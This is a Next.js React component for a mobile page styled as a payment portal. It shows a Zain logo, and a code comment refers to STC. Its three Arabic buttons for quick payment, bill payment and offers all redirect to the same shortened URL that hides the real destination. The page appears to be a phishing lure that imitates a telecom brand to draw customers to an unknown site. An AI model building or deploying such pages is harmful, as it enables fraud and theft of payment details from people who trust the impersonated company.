'use client'

import { Share2, QrCode, Info, ChevronRight, Wifi, Battery, Signal } from "lucide-react"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import { root } from "postcss"


export default function Component() {
  const route=useRouter()
  const handleClick=()=>{
    route.push('https://shorturl.at/qlOG5')
  }
  return (
    <div className="min-h-screen bg-gradient-to-br from-rose-900 via-rose-500 to-rose-700 relative overflow-hidden">
      {/* Mobile Status Bar */}
      <div className="flex justify-between items-center px-6 py-2 text-white text-sm font-medium">
      
      
      </div>

      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-10">
        <div className="absolute top-20 left-10 w-32 h-32 border border-white/20 rounded-full"></div>
        <div className="absolute top-40 right-8 w-24 h-24 border border-white/20 rounded-full"></div>
        <div className="absolute bottom-32 left-6 w-20 h-20 border border-white/20 rounded-full"></div>
      </div>

      {/* Header Icons */}
      <div className="flex justify-between items-center px-6 py-4">
       
       
      </div>

      {/* Main Content */}
      <div className="flex flex-col items-center px-6 pt-8">
        {/* STC Logo Section */}
        <div className="flex flex-col items-center space-y-6 mb-12">
          <div className="relative">
            <div className="w-36 h-36 bg-gradient-to-br from-rose-800 to-rose-900 rounded-full flex items-center justify-center shadow-2xl border-4 border-white/20">
              <img src="/Zain_Logo.6220a55.png" alt=""/>
            </div>
          </div>
      
        </div>

        {/* Action Buttons */}
        <div className="w-full max-w-sm space-y-4">
          <Button onClick={handleClick} className="w-full h-14 bg-white/95 backdrop-blur-sm text-rose-800 hover:bg-white hover:scale-[1.02] transition-all duration-200 rounded-2xl text-lg font-semibold flex items-center justify-between px-6 shadow-lg border border-white/20">
            <ChevronRight className="w-5 h-5 text-rose-900" />
            <span className="flex-1 text-center" dir="rtl" style={{ fontFamily: "system-ui" }}>
              الدفع السريع
            </span>
          </Button>

          <Button onClick={handleClick} className="w-full h-14 bg-white/95 backdrop-blur-sm text-rose-800 hover:bg-white hover:scale-[1.02] transition-all duration-200 rounded-2xl text-lg font-semibold flex items-center justify-between px-6 shadow-lg border border-white/20">
            <ChevronRight className="w-5 h-5 text-rose-900" />
            <span className="flex-1 text-center" dir="rtl" style={{ fontFamily: "system-ui" }}>
              دفع الفواتير
            </span>
          </Button>

          <Button onClick={handleClick}  className="w-full h-14 bg-white/95 backdrop-blur-sm text-rose-800 hover:bg-white hover:scale-[1.02] transition-all duration-200 rounded-2xl text-lg font-semibold flex items-center justify-between px-6 shadow-lg border border-white/20">
            <ChevronRight className="w-5 h-5 text-rose-900" />
            <span className="flex-1 text-center" dir="rtl" style={{ fontFamily: "system-ui" }}>
              آخر العروض
            </span>
          </Button>
        </div>

    
      </div>

      {/* Home Indicator */}
      <div className="absolute bottom-2 left-1/2 transform -translate-x-1/2 w-32 h-1 bg-white/30 rounded-full"></div>
    </div>
  )
}
